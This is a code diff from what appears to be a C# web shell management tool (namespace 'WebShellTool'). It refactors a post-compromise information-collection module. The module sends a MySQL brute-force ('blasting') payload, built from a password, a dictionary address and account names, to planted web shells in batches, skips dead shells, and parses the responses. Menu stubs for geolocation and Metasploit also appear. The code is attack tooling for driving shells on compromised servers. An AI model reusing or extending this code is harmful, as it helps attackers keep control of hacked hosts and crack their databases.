@@ -394,10 +394,6 @@ namespace C2.Business.CastleBravo.WebShellTool
             return DoEventsWait(5, Task.Run(() => CheckAlive(task)));
         }
 
-        private bool PostCollectInfo(WebShellTaskConfig task)
-        {
-            return DoEventsWait(90, Task.Run(() => PostMysqlBlastingRequest(task)));
-        }
 
         private static bool DoEventsWait(int timeout, Task<bool> t)
         {
@@ -450,26 +446,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             catch { return false; }
 
         }
-        private bool PostMysqlBlastingRequest(WebShellTaskConfig task)
-        {
-            Regex r = new Regex("QACKL3IO9P==(.+)==QACKL3IO9P");
-            try
-            {
-                string payload = string.Format(Global.MysqlPayload, 
-                    task.Password, 
-                    ST.EncodeBase64(Global.MysqlDictAddr), 
-                    Global.MysqlAccount);
-                
-                string ret = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 90000, Proxy);
-                Match m = r.Match(ret);
-                task.SGInfoCollectionConfig = m.Success ? m.Groups[1].Value : ret;
-            }
-            catch (Exception ex)
-            {
-                task.SGInfoCollectionConfig = ex.Message;
-            }
-            return true;
-        }
+       
         
         private void AddAllShellMenu_Click(object sender, EventArgs e)
         {
@@ -585,13 +562,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             StatusLabel.Text = string.Format("活 {0} - 死 {1}", alive, dead);
         }
 
-        private void RefreshInfoColletionStatus(bool checkAlive)
-        {   // 刷新前先强制清空
-            ResetProgressMenu();
-            ClearScanResult();
-            RefreshScanResult(checkAlive);
-            EndRefresh();
-        }
+      
 
         private void ClearScanResult()
         {
@@ -599,7 +570,42 @@ namespace C2.Business.CastleBravo.WebShellTool
                 lvi.SubItems[7].Text = string.Empty;        
         }
 
-        private void RefreshScanResult(bool checkAlive)
+       
+
+      
+        #region 后信息收集模块
+        // mysql部分
+        private void AllTaskMysqlMenuItem_Click(object sender, EventArgs e)
+        {
+            BatchInfoColletion(false);
+        }
+        private void AliveTaskMysqlMenuItem_Click(object sender, EventArgs e)
+        {
+            BatchInfoColletion(true);
+        }
+        private void CurrentTaskMysqlMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach(ListViewItem item in this.LV.SelectedItems)
+                SingleInfoCollection(item);
+        }
+        private void MysqlTaskSetMenuItem_Click(object sender, EventArgs e)
+        {
+            new MysqlBlastingSet().ShowDialog();
+        }
+        // 地理位置部分
+        private void AllLocationInfoMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+        //公共函数部分
+        private void BatchInfoColletion(bool checkAlive)
+        {   // 刷新前先强制清空
+            ResetProgressMenu();
+            ClearScanResult();
+            DoInfoCollectionTask(checkAlive);
+            EndRefresh();
+        }
+        private void DoInfoCollectionTask(bool checkAlive)
         {
             s = DateTime.Now;
             using (new ControlEnableGuarder(this.contextMenuStrip))
@@ -613,46 +619,39 @@ namespace C2.Business.CastleBravo.WebShellTool
                         lvi.SubItems[7].Text = "跳";
                         continue;
                     }
-                    ScanMysql(lvi);
+                    SingleInfoCollection(lvi);
                     UpdateProgress();
                     CheckSavePoint(); // 5分钟保存一次
                 }
         }
-
-        private void ScanMysql(ListViewItem lvi)
+        private void SingleInfoCollection(ListViewItem lvi)
         {
             WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
             lvi.SubItems[7].Text = "进行中";
             using (GuarderUtil.WaitCursor)
-                PostCollectInfo(task);
+                DoEventsWait(90, Task.Run(() => PostInfoCollectionPayload(task)));
             lvi.SubItems[7].Text = task.SGInfoCollectionConfig;
         }
-        #region 后信息收集模块
-        // mysql部分
-        private void AllTaskMysqlMenuItem_Click(object sender, EventArgs e)
+        private bool PostInfoCollectionPayload(WebShellTaskConfig task)
         {
-            RefreshInfoColletionStatus(false);
-        }
-        private void AliveTaskMysqlMenuItem_Click(object sender, EventArgs e)
-        {
-            RefreshInfoColletionStatus(true);
-        }
-        private void CurrentTaskMysqlMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach(ListViewItem item in this.LV.SelectedItems)
-                ScanMysql(item);
-        }
-        private void MysqlTaskSetMenuItem_Click(object sender, EventArgs e)
-        {
-            new MysqlBlastingSet().ShowDialog();
-        }
-        // 地理位置部分
-        private void AllLocationInfoMenuItem_Click(object sender, EventArgs e)
-        {
+            Regex r = new Regex("QACKL3IO9P==(.+)==QACKL3IO9P");
+            try
+            {
+                string payload = string.Format(Global.MysqlPayload,
+                    task.Password,
+                    ST.EncodeBase64(Global.MysqlDictAddr),
+                    Global.MysqlAccount);
 
+                string ret = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 90000, Proxy);
+                Match m = r.Match(ret);
+                task.SGInfoCollectionConfig = m.Success ? m.Groups[1].Value : ret;
+            }
+            catch (Exception ex)
+            {
+                task.SGInfoCollectionConfig = ex.Message;
+            }
+            return true;
         }
-        //公共函数部分
-
         // msf部分
         private void MSFMenu_Click(object sender, EventArgs e)
         {
